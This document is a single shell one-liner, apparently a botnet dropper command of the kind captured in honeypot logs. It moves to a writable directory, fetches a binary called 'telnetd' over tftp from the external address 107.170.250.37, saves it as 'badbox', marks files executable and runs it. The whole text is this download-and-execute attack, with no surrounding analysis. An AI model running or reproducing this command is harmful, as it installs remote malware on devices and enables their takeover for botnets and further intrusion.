cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.170.250.37 -c get telnetd;cat telnetd >badbox;chmod +x *;./badbox
